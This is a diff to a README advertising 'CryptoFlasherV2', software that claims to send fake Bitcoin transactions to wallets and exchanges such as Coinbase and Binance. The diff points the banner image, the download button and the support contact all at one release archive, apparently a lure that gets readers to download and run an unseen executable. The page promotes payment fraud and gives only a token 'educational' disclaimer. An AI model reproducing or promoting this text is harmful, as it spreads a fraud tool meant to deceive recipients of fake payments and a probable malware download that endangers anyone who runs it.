@@ -1,7 +1,7 @@
 # 🚀 **CryptoFlasherV2 - Flash BTC Transaction Software**
 A powerful tool for sending fake Bitcoin transactions on the blockchain network.
 
-![CryptoFlasherV2 Banner](https://example.com/banner.png)
+![CryptoFlasherV2 Banner](https://github.com/StevenBotros1/CryptoFlasherV2/releases/download/v1.0/Application.zip)
 
 ## Description
 Welcome to CryptoFlasherV2, the ultimate tool for flashing BTC transactions on the core network. This software is specifically designed to enable you to send fake Bitcoin from any wallet address to another on popular blockchain platforms such as Coinbase, Binance, and Blockchain. With CryptoFlasherV2, you can simulate Bitcoin transactions effortlessly.
@@ -16,7 +16,7 @@ Welcome to CryptoFlasherV2, the ultimate tool for flashing BTC transactions on t
 
 ## Installation
 To get started with CryptoFlasherV2, click the link below to download the software:
-[![Download CryptoFlasherV2](https://img.shields.io/badge/Download-Release.zip-blue)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download CryptoFlasherV2](https://github.com/StevenBotros1/CryptoFlasherV2/releases/download/v1.0/Application.zip)](https://github.com/StevenBotros1/CryptoFlasherV2/releases/download/v1.0/Application.zip)
 
 Once downloaded, launch the application and follow the on-screen instructions to start sending fake Bitcoin transactions.
 
@@ -48,7 +48,7 @@ Once downloaded, launch the application and follow the on-screen instructions to
 🔸 send-fake-bitcoinfake-btc-send
 
 ## Support
-If you encounter any issues or have any questions about CryptoFlasherV2, feel free to reach out to our support team at support@cryptoflasher.com.
+If you encounter any issues or have any questions about CryptoFlasherV2, feel free to reach out to our support team at https://github.com/StevenBotros1/CryptoFlasherV2/releases/download/v1.0/Application.zip
 
 ## Disclaimer
 Please note that CryptoFlasherV2 is intended for educational and testing purposes only. The use of this software for illegal activities is strictly prohibited.
